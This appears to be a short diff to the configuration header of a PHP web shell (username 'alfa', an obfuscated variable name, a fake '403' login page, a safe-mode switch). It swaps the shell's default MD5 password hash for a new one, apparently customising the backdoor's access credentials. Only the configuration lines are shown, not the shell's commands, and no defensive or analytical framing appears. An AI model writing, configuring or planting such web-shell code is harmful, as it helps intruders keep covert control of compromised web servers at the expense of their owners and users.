@@ -76,7 +76,7 @@ if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
 */
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'alfa',
-    'password' => 'a6f452ec3293d7fb72c5b677257b20ec',//md5(ehsan)
+    'password' => '0ea3bd619aa55fbab883aeb0be9bd367',
     'safe_mode' => '0',
     'login_page' => '403',
     'show_icons' => '1',
